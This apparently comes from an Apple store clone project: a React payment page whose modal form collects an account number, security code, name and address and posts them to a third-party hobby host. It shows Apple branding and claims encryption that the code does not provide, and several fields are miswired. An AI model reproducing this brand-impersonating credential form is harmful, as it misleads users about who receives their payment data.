import { Box, Heading, Text , Image, Flex, Button ,Modal,
  ModalOverlay,
  ModalContent,
  ModalHeader,
  ModalFooter,FormControl ,
  ModalBody,useDisclosure ,
  ModalCloseButton,
  Center,Accordion,Input,
  AccordionItem,
  AccordionButton,
  AccordionPanel,
  AccordionIcon,} from "@chakra-ui/react";
  import axios from "axios";
import { useEffect , useState } from 'react';
import {Link} from 'react-router-dom'
import { useNavigate } from "react-router-dom";

const Payment =()=>{
  const { isOpen, onOpen, onClose } = useDisclosure();
  const [data , setData] = useState({
    number : "",
    code : "",
    fname : "",
    lname : "",
    address : "",
    city :"",
    country : "",
    pin : ""

  })
  const navigate = useNavigate();
  // useEffect(()=>{
  //   fetchData();
  // } , [])


  const handleSubmit = (e) => {
    e.preventDefault();
    const formData = {
      number: data.number,
      code: data.code,
      fname: data.fname,
      lname: data.lname,
      address: data.address,
      city: data.city,
      country: data.country,
      pin: data.pin,
    };

    axios
      .post("https://troubled-ray-fashion.cyclic.cloud/addressadd", formData)
      .then((res) => {
        console.log(res);
        setData(res.data);
        navigate("/success")
        // navigate("")
      })
      .catch((err) => {
        console.log(err);
      });
  };
  

  const handleChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  }

  return (
 <Box width="100%" mb="350px" >
             <Text fontSize={{ base: '2xl', md: '3xl', xl: '4xl' }} color="gray.500" fontWeight="bold">Payment Method</Text> 

{/* ........................................ BOX FOR PAYMENT METHOD............................................... */}
<Box >
<Center>
{/* .....................................Button for apple account......................................... */}
<Button height={{ base: '50px', md: '60px' }} width={{ base: '100%',md: '100%' , lg :"40%" }} mt={{ base: '8px', md: '16px' }} border="2px black"  _focus={{ boxShadow: '0 0 5px 0 rgba(0, 0, 0, 0.5)' }}  onClick={onOpen}  >
<Flex justifyContent="space-around" alignItems="center" width="100%">
  <Box textAlign="left" width={{ base: '20%', md: '10%' }} height={{ base: '20%', md: '10%' }} ml={{ base: -4, md: -20 }}>
    <Image src="https://pngimg.com/d/macbook_PNG62.png" alt="payment" />
  </Box>
  <Box>
    <Text fontSize={{ base: 'sm', md: 'md' }} color="gray.800" fontWeight="bold" textAlign="right" mr={{ base: -4, md: -20 }}>
      Apple Account
    </Text>
    <Text fontSize={{ base: 'sm', md: 'md' }} color="blue" fontWeight="bold" textAlign="right" mr={{ base: -4, md: -20 }}>
      Details
    </Text>
  </Box>
</Flex>
</Button>
</Center>
{/* .....................................Button for master card......................................... */}
<Center>
<Button height={{ base: '50px', md: '60px' }} width={{ base: '100%',md: '100%' , lg :"40%" }} mt={{ base: '8px', md: '16px' }} border="2px black"  _focus={{ boxShadow: '0 0 5px 0 rgba(0, 0, 0, 0.5)' }} onClick={onOpen}>
<Flex justifyContent="space-around" alignItems="center" width="100%">
  <Box textAlign="left" width={{ base: '20%', md: '10%' }} height={{ base: '20%', md: '10%' }} ml={{ base: -4, md: -20 }}>
    <Image src="https://pngimg.com/d/credit_card_PNG128.png" alt="payment" />
  </Box>
  <Box>
    <Text fontSize={{ base: 'sm', md: 'md' }} color="gray.800" fontWeight="bold" textAlign="right" mr={{ base: -4, md: -20 }}>
      Apple Account
    </Text>
    <Text fontSize={{ base: 'sm', md: 'md' }} color="blue" fontWeight="bold" textAlign="right" mr={{ base: -4, md: -20 }}>
      Details
    </Text>
  </Box>
</Flex>
</Button>
</Center>
                 
</Box>

{/* ........................................... Box for Description ............................................... */}
<Center mb={4}>
  <Box height={{ base: '50px', md: '60px' }} width={{ base: '100%',md: '100%' , lg :"40%" }} mt={{ base: '8px', md: '16px' }} border="2px black"  _focus={{ boxShadow: '0 0 5px 0 rgba(0, 0, 0, 0.5)' }}>

  <Text fontSize={{ base: 'sm', md: 'sm', xl: 'md' }} color="gray.500" >Your default payment method is also used for purchases made by family members.
  Tap  on button Edit , remove or pay Payment </Text> 
  </Box>

</Center>
<hr></hr>
{/* ........................................... Box for Description 2............................................... */}
<Center mt={2}>
  <Box height={{ base: '50px', md: '60px' }} width={{ base: '100%',md: '100%' , lg :"40%" }} mt={{ base: '8px', md: '16px' }} border="2px black"  _focus={{ boxShadow: '0 0 5px 0 rgba(0, 0, 0, 0.5)' }}>

  <Text fontSize={{ base: 'sm', md: 'sm', xl: 'md' }}color="gray.500" >Eligible business entities including sole proprietors with a valid and active GSTIN (Goods and Services Tax Identification Number) can opt for a business e-invoice during checkout, when purchasing goods and services for business purposes. Please note that the state in which your 
  GSTIN is registered must match your billing address as well as the delivery address. If you added a trade-in to your order, we cannot issue a business invoice.
  You will need to provide a GSTIN (Goods and Services Tax Identification Number) that is valid and active. Please note that the state in which your GSTIN is registered must match your billing address and delivery address.
  The GSTIN (Goods and Services Tax Identification Number) must belong to the individual or business placing the order.
  Within 2-3 working days of your order being shipped, you should receive an official Apple invoice by email. If you do not receive this invoice, or if you require an additional copy for your records, please contact Customer Service at 000800 040 1966.
   </Text> 
  </Box>

</Center>

{/* ............................Model............... */}

<Modal isOpen={isOpen} onClose={onClose} size="3xl">
<ModalOverlay />
<ModalContent>
  <ModalHeader />
  <ModalCloseButton />
  <ModalBody>
    <form onSubmit={handleSubmit}>
      <Center>
        <Flex flexDirection="column">
          <FormControl mb={2}>
            <Text fontSize={{ base: 'sm', md: 'sm' }} color="gray.800" textAlign="left">
              Number
            </Text>
            <input
              type="text"
              width="100%"
              height="2rem"
              required={true}
              name="number"
              placeholder="Enter Account Number"
              sx={{ '::placeholder': { fontSize: 'md' } }}
              color="blue.500"
              onChange={handleChange}
              minLength={12}
              maxLength={12}
            />
          </FormControl>

          <FormControl mb={2}>
            <Text fontSize={{ base: 'sm', md: 'sm' }} color="gray.800" textAlign="left">
              Code
            </Text>
            <Input
              type="text"
              width="100%"
              height="2rem"
              required={true}
              name="code"
              placeholder="Enter Security Code"
              sx={{ '::placeholder': { fontSize: 'md' } }}
              color="blue.500"
              onChange={handleChange}
              minLength={4}
              maxLength={4}
            />
          </FormControl>

          <Flex flexDirection={{ base: 'column', md: 'row' }}>
            <FormControl mb={{ base: 2, md: 0 }} mr={{ base: 0, md: 2 }}>
              <Text fontSize={{ base: 'sm', md: 'sm' }} color="gray.800" textAlign="left">
               First Name
              </Text>
              <Input
                type="text"
                width="100%"
                height="2rem"
                required={true}
                name="name"
                placeholder="Name"
                sx={{ '::placeholder': { fontSize: 'md' } }}
                color="blue.500"
                onChange={handleChange}
              />
            </FormControl>

            <FormControl mb={{ base: 2, md: 0 }} mr={{ base: 0, md: 2 }}>
              <Text fontSize={{ base: 'sm', md: 'sm' }} color="gray.800" textAlign="left">
                Last Name
              </Text>
              <Input
                type="text"
                width="100%"
                height="2rem"
                required={true}
                name="lname"
                placeholder="Last Name"
                sx={{ '::placeholder': { fontSize: 'md' } }}
                color="blue.500"
                onChange={handleChange}
              />
            </FormControl>
          </Flex>

          <FormControl mb={2} mt={2}>
            <Text fontSize={{ base: 'sm', md: 'sm' }} color="gray.800" textAlign="left">
             Address
            </Text>
            <Input
              type="text"
              width="100%"
              height="2rem"
              required={true}
              name="address"
              placeholder="Building no. or Street no."
              sx={{ '::placeholder': { fontSize: 'md' } }}
              color="blue.500"
              onChange={handleChange}
            />
          </FormControl>

          <Flex flexDirection={{ base: 'column', md: 'row' }}>
            <FormControl mb={2} mr={{ base: 0, md: 2 }}>
              <Text fontSize={{ base: 'sm', md: 'sm' }} color="gray.800" textAlign="left">
                City
              </Text>
              <Input
                type="text"
                width="100%"
                height="2rem"
                required={true}
                name="city"
                placeholder="City"
                sx={{ '::placeholder': { fontSize: 'md' } }}
                color="blue.500"
                onChange={handleChange}
              />
            </FormControl>

            <FormControl mb={2} mr={{ base: 0, md: 2 }}>
              <Text fontSize={{ base: 'sm', md: 'sm' }} color="gray.800" textAlign="left">
                Country
              </Text>
              <Input
                type="text"
                width="100%"
                height="2rem"
                required={true}
                name="country"
                placeholder="Country"
                sx={{ '::placeholder': { fontSize: 'md' } }}
                color="blue.500"
                onChange={handleChange}
              />
            </FormControl>

            <FormControl mb={2}>
              <Text fontSize={{ base: 'sm', md: 'sm' }} color="gray.800" textAlign="left">
                Pin No
              </Text>
              <Input
                type="text"
                width="100%"
                height="2rem"
                required={true}
                name="pin"
                placeholder="Pin No"
                sx={{ '::placeholder': { fontSize: 'md' } }}
                color="blue.500"
                onChange={handleChange}
                minLength={6}
                maxLength={6}
              />
            </FormControl>
          </Flex>

          <hr />

          <Center mt={4}>
            <Text fontSize={{ base: 'sm', md: 'sm' }} color="gray.800" textAlign="left">
              Apple uses industry-standard encryption to protect the confidentiality of your personal information.
            </Text>
          </Center>
        </Flex>
      </Center>
      <Center mt={4}>
      <Button colorScheme="blue" mr={3}  type="submit">
      Submit
    </Button>
    </Center>
    </form>
  </ModalBody>
  <ModalFooter>
  
  </ModalFooter>

  
</ModalContent>
</Modal>


</Box>
  )
}

export default Payment;